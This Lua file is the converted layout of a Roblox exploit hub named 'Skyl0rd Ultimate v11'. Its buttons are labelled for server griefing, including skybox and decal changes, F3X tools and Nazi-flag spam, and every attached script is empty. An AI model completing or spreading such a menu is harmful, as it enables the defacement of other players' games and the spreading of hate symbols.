--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 88 | Scripts: 37 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;


-- StarterGui.ScreenGui.Frame
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 4;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2"]["Size"] = UDim2.new(0, 383, 0, 430);
G2L["2"]["Position"] = UDim2.new(0.12602, 0, 0.07804, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(255, 165, 9);


-- StarterGui.ScreenGui.Frame.LocalScript
G2L["3"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame
G2L["4"] = Instance.new("ScrollingFrame", G2L["2"]);
G2L["4"]["Active"] = true;
G2L["4"]["BorderSizePixel"] = 3;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["Size"] = UDim2.new(0, 383, 0, 432);
G2L["4"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["Position"] = UDim2.new(-0.00261, 0, 0, 0);
G2L["4"]["BorderColor3"] = Color3.fromRGB(255, 132, 24);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextLabel
G2L["5"] = Instance.new("TextLabel", G2L["4"]);
G2L["5"]["TextWrapped"] = true;
G2L["5"]["BorderSizePixel"] = 0;
G2L["5"]["TextSize"] = 14;
G2L["5"]["TextScaled"] = true;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/Zekton.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Size"] = UDim2.new(0, 272, 0, 40);
G2L["5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Text"] = [[Skyl0rd Ultimate v11]];
G2L["5"]["Position"] = UDim2.new(0.14087, 0, -0.00272, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["6"] = Instance.new("TextButton", G2L["4"]);
G2L["6"]["TextWrapped"] = true;
G2L["6"]["BorderSizePixel"] = 3;
G2L["6"]["TextSize"] = 14;
G2L["6"]["TextScaled"] = true;
G2L["6"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["6"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["6"]["Text"] = [[Skybox]];
G2L["6"]["Position"] = UDim2.new(0.04524, 0, 0.0811, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["7"] = Instance.new("LocalScript", G2L["6"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["8"] = Instance.new("TextButton", G2L["4"]);
G2L["8"]["TextWrapped"] = true;
G2L["8"]["BorderSizePixel"] = 3;
G2L["8"]["TextSize"] = 14;
G2L["8"]["TextScaled"] = true;
G2L["8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["8"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["8"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["8"]["Text"] = [[Decal ]];
G2L["8"]["Position"] = UDim2.new(0.58832, 0, 0.0811, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["9"] = Instance.new("LocalScript", G2L["8"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["a"] = Instance.new("TextButton", G2L["4"]);
G2L["a"]["TextWrapped"] = true;
G2L["a"]["BorderSizePixel"] = 3;
G2L["a"]["TextSize"] = 14;
G2L["a"]["TextScaled"] = true;
G2L["a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["a"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["a"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["a"]["Text"] = [[Particles]];
G2L["a"]["Position"] = UDim2.new(0.58832, 0, 0.14828, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["b"] = Instance.new("LocalScript", G2L["a"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["c"] = Instance.new("TextButton", G2L["4"]);
G2L["c"]["TextWrapped"] = true;
G2L["c"]["BorderSizePixel"] = 3;
G2L["c"]["TextSize"] = 14;
G2L["c"]["TextScaled"] = true;
G2L["c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["c"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["c"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["c"]["Text"] = [[world tour trippy]];
G2L["c"]["Position"] = UDim2.new(0.04524, 0, 0.14828, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["d"] = Instance.new("LocalScript", G2L["c"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["e"] = Instance.new("TextButton", G2L["4"]);
G2L["e"]["TextWrapped"] = true;
G2L["e"]["BorderSizePixel"] = 3;
G2L["e"]["TextSize"] = 14;
G2L["e"]["TextScaled"] = true;
G2L["e"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["e"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["e"]["Text"] = [[Disco]];
G2L["e"]["Position"] = UDim2.new(0.58832, 0, 0.21739, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["f"] = Instance.new("LocalScript", G2L["e"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["10"] = Instance.new("TextButton", G2L["4"]);
G2L["10"]["TextWrapped"] = true;
G2L["10"]["BorderSizePixel"] = 3;
G2L["10"]["TextSize"] = 14;
G2L["10"]["TextScaled"] = true;
G2L["10"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["10"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["10"]["Text"] = [[Neon Map]];
G2L["10"]["Position"] = UDim2.new(0.04524, 0, 0.21739, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["11"] = Instance.new("LocalScript", G2L["10"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextLabel
G2L["12"] = Instance.new("TextLabel", G2L["4"]);
G2L["12"]["TextWrapped"] = true;
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["TextSize"] = 14;
G2L["12"]["TextScaled"] = true;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["FontFace"] = Font.new([[rbxasset://fonts/families/Zekton.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["12"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["BackgroundTransparency"] = 4532;
G2L["12"]["Size"] = UDim2.new(0, 330, 0, 20);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Text"] = [[by Skyl*rd Ui Based Off Lnicky v3.60 remake]];
G2L["12"]["Position"] = UDim2.new(0.04426, 0, 0.0396, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["13"] = Instance.new("TextButton", G2L["4"]);
G2L["13"]["TextWrapped"] = true;
G2L["13"]["BorderSizePixel"] = 3;
G2L["13"]["TextSize"] = 14;
G2L["13"]["TextScaled"] = true;
G2L["13"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["13"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["13"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["13"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["13"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["13"]["Text"] = [[Roatate Spam]];
G2L["13"]["Position"] = UDim2.new(0.04524, 0, 0.29231, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["14"] = Instance.new("LocalScript", G2L["13"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["15"] = Instance.new("TextButton", G2L["4"]);
G2L["15"]["TextWrapped"] = true;
G2L["15"]["BorderSizePixel"] = 3;
G2L["15"]["TextSize"] = 14;
G2L["15"]["TextScaled"] = true;
G2L["15"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["15"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["15"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["15"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["15"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["15"]["Text"] = [[Respawn Spawn]];
G2L["15"]["Position"] = UDim2.new(0.58832, 0, 0.29231, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["16"] = Instance.new("LocalScript", G2L["15"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["17"] = Instance.new("TextButton", G2L["4"]);
G2L["17"]["TextWrapped"] = true;
G2L["17"]["BorderSizePixel"] = 3;
G2L["17"]["TextSize"] = 14;
G2L["17"]["TextScaled"] = true;
G2L["17"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["17"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["17"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["17"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["17"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["17"]["Text"] = [[el elv4r0x  Trippy]];
G2L["17"]["Position"] = UDim2.new(0.58832, 0, 0.36413, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["18"] = Instance.new("LocalScript", G2L["17"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["19"] = Instance.new("TextButton", G2L["4"]);
G2L["19"]["TextWrapped"] = true;
G2L["19"]["BorderSizePixel"] = 3;
G2L["19"]["TextSize"] = 14;
G2L["19"]["TextScaled"] = true;
G2L["19"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["19"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["19"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["19"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["19"]["Text"] = [[Andres Gui ]];
G2L["19"]["Position"] = UDim2.new(0.04524, 0, 0.36318, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["1a"] = Instance.new("LocalScript", G2L["19"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["1b"] = Instance.new("TextButton", G2L["4"]);
G2L["1b"]["TextWrapped"] = true;
G2L["1b"]["BorderSizePixel"] = 3;
G2L["1b"]["TextSize"] = 14;
G2L["1b"]["TextScaled"] = true;
G2L["1b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["1b"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["1b"]["Text"] = [[iOrb]];
G2L["1b"]["Position"] = UDim2.new(0.58832, 0, 0.43055, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["1c"] = Instance.new("LocalScript", G2L["1b"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["1d"] = Instance.new("TextButton", G2L["4"]);
G2L["1d"]["TextWrapped"] = true;
G2L["1d"]["BorderSizePixel"] = 3;
G2L["1d"]["TextSize"] = 14;
G2L["1d"]["TextScaled"] = true;
G2L["1d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["1d"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["1d"]["Text"] = [[Grab Knife V4]];
G2L["1d"]["Position"] = UDim2.new(0.04524, 0, 0.43016, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["1e"] = Instance.new("LocalScript", G2L["1d"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["1f"] = Instance.new("TextButton", G2L["4"]);
G2L["1f"]["TextWrapped"] = true;
G2L["1f"]["BorderSizePixel"] = 3;
G2L["1f"]["TextSize"] = 14;
G2L["1f"]["TextScaled"] = true;
G2L["1f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1f"]["Size"] = UDim2.new(0, 129, 0, 31);
G2L["1f"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["1f"]["Text"] = [[Animated Skeleton Spam]];
G2L["1f"]["Position"] = UDim2.new(0.58832, 0, 0.58727, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["20"] = Instance.new("LocalScript", G2L["1f"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["21"] = Instance.new("TextButton", G2L["4"]);
G2L["21"]["TextWrapped"] = true;
G2L["21"]["BorderSizePixel"] = 3;
G2L["21"]["TextSize"] = 14;
G2L["21"]["TextScaled"] = true;
G2L["21"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["21"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["21"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["21"]["Size"] = UDim2.new(0, 129, 0, 30);
G2L["21"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["21"]["Text"] = [[skyl0rd N*zi Spam]];
G2L["21"]["Position"] = UDim2.new(0.04524, 0, 0.58507, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["22"] = Instance.new("LocalScript", G2L["21"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["23"] = Instance.new("TextButton", G2L["4"]);
G2L["23"]["TextWrapped"] = true;
G2L["23"]["BorderSizePixel"] = 3;
G2L["23"]["TextSize"] = 14;
G2L["23"]["TextScaled"] = true;
G2L["23"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["23"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["23"]["Size"] = UDim2.new(0, 129, 0, 46);
G2L["23"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["23"]["Text"] = [[Red  N*zi Flag Spam]];
G2L["23"]["Position"] = UDim2.new(0.58832, 0, 0.63932, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["24"] = Instance.new("LocalScript", G2L["23"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["25"] = Instance.new("TextButton", G2L["4"]);
G2L["25"]["TextWrapped"] = true;
G2L["25"]["BorderSizePixel"] = 3;
G2L["25"]["TextSize"] = 14;
G2L["25"]["TextScaled"] = true;
G2L["25"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["25"]["Size"] = UDim2.new(0, 129, 0, 28);
G2L["25"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["25"]["Text"] = [[R4DKidd Gui Leak]];
G2L["25"]["Position"] = UDim2.new(0.04524, 0, 0.63216, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["26"] = Instance.new("LocalScript", G2L["25"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["27"] = Instance.new("TextButton", G2L["4"]);
G2L["27"]["TextWrapped"] = true;
G2L["27"]["BorderSizePixel"] = 3;
G2L["27"]["TextSize"] = 14;
G2L["27"]["TextScaled"] = true;
G2L["27"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["27"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["27"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["27"]["Text"] = [[HeadShake]];
G2L["27"]["Position"] = UDim2.new(0.58832, 0, 0.76143, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["28"] = Instance.new("LocalScript", G2L["27"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["29"] = Instance.new("TextButton", G2L["4"]);
G2L["29"]["TextWrapped"] = true;
G2L["29"]["BorderSizePixel"] = 3;
G2L["29"]["TextSize"] = 14;
G2L["29"]["TextScaled"] = true;
G2L["29"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["29"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["29"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["29"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["29"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["29"]["Text"] = [[Chicken Arms]];
G2L["29"]["Position"] = UDim2.new(0.04524, 0, 0.76045, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["2a"] = Instance.new("LocalScript", G2L["29"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["2b"] = Instance.new("TextButton", G2L["4"]);
G2L["2b"]["TextWrapped"] = true;
G2L["2b"]["BorderSizePixel"] = 3;
G2L["2b"]["TextSize"] = 14;
G2L["2b"]["TextScaled"] = true;
G2L["2b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2b"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["2b"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["2b"]["Text"] = [[Anti Robloxian]];
G2L["2b"]["Position"] = UDim2.new(0.58832, 0, 0.88069, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["2c"] = Instance.new("LocalScript", G2L["2b"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["2d"] = Instance.new("TextButton", G2L["4"]);
G2L["2d"]["TextWrapped"] = true;
G2L["2d"]["BorderSizePixel"] = 3;
G2L["2d"]["TextSize"] = 14;
G2L["2d"]["TextScaled"] = true;
G2L["2d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2d"]["Size"] = UDim2.new(0, 129, 0, 41);
G2L["2d"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["2d"]["Text"] = [[Float Pad]];
G2L["2d"]["Position"] = UDim2.new(0.58832, 0, 0.82164, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["2e"] = Instance.new("LocalScript", G2L["2d"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["2f"] = Instance.new("TextButton", G2L["4"]);
G2L["2f"]["TextWrapped"] = true;
G2L["2f"]["BorderSizePixel"] = 3;
G2L["2f"]["TextSize"] = 14;
G2L["2f"]["TextScaled"] = true;
G2L["2f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2f"]["Size"] = UDim2.new(0, 129, 0, 46);
G2L["2f"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["2f"]["Text"] = [[Mesh Disco]];
G2L["2f"]["Position"] = UDim2.new(0.04524, 0, 0.8168, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["30"] = Instance.new("LocalScript", G2L["2f"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["31"] = Instance.new("TextButton", G2L["4"]);
G2L["31"]["TextWrapped"] = true;
G2L["31"]["BorderSizePixel"] = 3;
G2L["31"]["TextSize"] = 14;
G2L["31"]["TextScaled"] = true;
G2L["31"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["31"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["31"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["31"]["Size"] = UDim2.new(0, 330, 0, -22);
G2L["31"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["31"]["Text"] = [[Music GUI]];
G2L["31"]["Position"] = UDim2.new(0.06352, 0, 0.9696, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["32"] = Instance.new("LocalScript", G2L["31"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["33"] = Instance.new("TextButton", G2L["4"]);
G2L["33"]["TextWrapped"] = true;
G2L["33"]["BorderSizePixel"] = 3;
G2L["33"]["TextSize"] = 14;
G2L["33"]["TextScaled"] = true;
G2L["33"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["33"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["33"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["33"]["Size"] = UDim2.new(0, 50, 0, 31);
G2L["33"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["33"]["Text"] = [[Theme]];
G2L["33"]["Position"] = UDim2.new(-0.00176, 0, -0.00178, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["34"] = Instance.new("LocalScript", G2L["33"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["35"] = Instance.new("TextButton", G2L["4"]);
G2L["35"]["TextWrapped"] = true;
G2L["35"]["BorderSizePixel"] = 3;
G2L["35"]["TextSize"] = 14;
G2L["35"]["TextScaled"] = true;
G2L["35"]["TextDirection"] = Enum.TextDirection.LeftToRight;
G2L["35"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["35"]["Size"] = UDim2.new(0, 56, 0, 29);
G2L["35"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["35"]["Text"] = [[F3X]];
G2L["35"]["Position"] = UDim2.new(0.85203, 0, -0.00274, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["36"] = Instance.new("LocalScript", G2L["35"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextLabel
G2L["37"] = Instance.new("TextLabel", G2L["4"]);
G2L["37"]["TextWrapped"] = true;
G2L["37"]["BorderSizePixel"] = 0;
G2L["37"]["TextSize"] = 14;
G2L["37"]["TextScaled"] = true;
G2L["37"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["37"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["37"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["Size"] = UDim2.new(0, 529, 0, 46);
G2L["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["Text"] = [[c00l /Scripts]];
G2L["37"]["Position"] = UDim2.new(-0.22728, 0, 0.70145, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["38"] = Instance.new("TextButton", G2L["4"]);
G2L["38"]["TextWrapped"] = true;
G2L["38"]["BorderSizePixel"] = 3;
G2L["38"]["TextSize"] = 14;
G2L["38"]["TextScaled"] = true;
G2L["38"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["38"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["38"]["Size"] = UDim2.new(0, 129, 0, 46);
G2L["38"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["38"]["Text"] = [[Disco Character]];
G2L["38"]["Position"] = UDim2.new(0.04263, 0, 0.87959, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
G2L["39"] = Instance.new("LocalScript", G2L["38"]);



-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton
G2L["3a"] = Instance.new("TextButton", G2L["4"]);
G2L["3a"]["TextWrapped"] = true;
G2L["3a"]["BorderSizePixel"] = 3;
G2L["3a"]["TextSize"] = 14;
G2L["3a"]["TextScaled"] = true;
G2L["3a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3a"]["Size"] = UDim2.new(0, 129, 0, 24);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(255, 130, 40);
G2L["3a"]["Text"] = [[OLDF3X (Skybox]];
G2L["3a"]["Position"] = UDim2.new(0.58832, 0, 0.48883, 0);


-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
